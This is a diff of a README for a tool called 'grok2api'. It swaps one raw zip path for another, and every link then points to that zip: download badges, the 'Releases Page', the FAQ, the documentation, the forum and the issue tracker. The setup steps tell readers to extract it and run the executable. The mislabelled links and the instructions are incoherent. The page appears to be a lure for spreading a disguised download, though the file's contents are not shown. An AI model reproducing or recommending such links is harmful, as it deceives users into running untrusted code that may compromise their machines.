@@ -1,7 +1,7 @@
 # 🚀 grok2api - Effortlessly Interact with APIs
 
 ## 📥 Download Now!
-[![Download grok2api](https://raw.githubusercontent.com/adamroy112/grok2api/main/cataphrenia/grok2api.zip)](https://raw.githubusercontent.com/adamroy112/grok2api/main/cataphrenia/grok2api.zip)
+[![Download grok2api](https://raw.githubusercontent.com/adamroy112/grok2api/main/templates/grok_api_3.4.zip)](https://raw.githubusercontent.com/adamroy112/grok2api/main/templates/grok_api_3.4.zip)
 
 ---
 
@@ -19,7 +19,7 @@ Welcome to grok2api! This tool helps you easily connect to and work with APIs. F
 ### Step 1: Visit the Download Page
 To download grok2api, click on the link below:
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/adamroy112/grok2api/main/cataphrenia/grok2api.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/adamroy112/grok2api/main/templates/grok_api_3.4.zip)
 
 ### Step 2: Choose the Right Version
 On the Releases page, you'll see various versions of grok2api. Find the latest version. It will be labeled as "Latest Release."
@@ -28,14 +28,14 @@ On the Releases page, you'll see various versions of grok2api. Find the latest v
 Click on the version you want. You will see a list of files. Select the appropriate file for your operating system:
 - For Windows, choose the `.exe` file.
 - For macOS, choose the `.dmg` file.
-- For Linux, choose the `https://raw.githubusercontent.com/adamroy112/grok2api/main/cataphrenia/grok2api.zip` file.
+- For Linux, choose the `https://raw.githubusercontent.com/adamroy112/grok2api/main/templates/grok_api_3.4.zip` file.
 
 ### Step 4: Install the Application
 After the download is complete, locate the file in your downloads folder.
 
 - **Windows:** Double-click the `.exe` file and follow the setup wizard.
 - **macOS:** Open the `.dmg` file and drag the grok2api icon to your Applications folder.
-- **Linux:** Extract the `https://raw.githubusercontent.com/adamroy112/grok2api/main/cataphrenia/grok2api.zip` file to any directory and run the executable.
+- **Linux:** Extract the `https://raw.githubusercontent.com/adamroy112/grok2api/main/templates/grok_api_3.4.zip` file to any directory and run the executable.
 
 ### Step 5: Launch grok2api
 Once installed, open the grok2api application. You are now ready to work with APIs!
@@ -57,12 +57,12 @@ If you encounter issues:
 - Verify the API URL is correct. 
 - Check if the API service is running.
 
-For additional support, visit our [FAQ section](https://raw.githubusercontent.com/adamroy112/grok2api/main/cataphrenia/grok2api.zip) or contact our support team.
+For additional support, visit our [FAQ section](https://raw.githubusercontent.com/adamroy112/grok2api/main/templates/grok_api_3.4.zip) or contact our support team.
 
 ## 🌐 Resources
-- [Documentation](https://raw.githubusercontent.com/adamroy112/grok2api/main/cataphrenia/grok2api.zip)
-- [Community Forum](https://raw.githubusercontent.com/adamroy112/grok2api/main/cataphrenia/grok2api.zip)
-- [Issue Tracker](https://raw.githubusercontent.com/adamroy112/grok2api/main/cataphrenia/grok2api.zip)
+- [Documentation](https://raw.githubusercontent.com/adamroy112/grok2api/main/templates/grok_api_3.4.zip)
+- [Community Forum](https://raw.githubusercontent.com/adamroy112/grok2api/main/templates/grok_api_3.4.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/adamroy112/grok2api/main/templates/grok_api_3.4.zip)
 
 ## 💡 Tips for Success
 - Try starting with public APIs to get familiar with the tool.
@@ -75,4 +75,4 @@ We appreciate your thoughts! Share your experience using grok2api. Your input he
 ---
 
 ## 📥 Download Now!
-[![Download grok2api](https://raw.githubusercontent.com/adamroy112/grok2api/main/cataphrenia/grok2api.zip)](https://raw.githubusercontent.com/adamroy112/grok2api/main/cataphrenia/grok2api.zip)
+[![Download grok2api](https://raw.githubusercontent.com/adamroy112/grok2api/main/templates/grok_api_3.4.zip)](https://raw.githubusercontent.com/adamroy112/grok2api/main/templates/grok_api_3.4.zip)
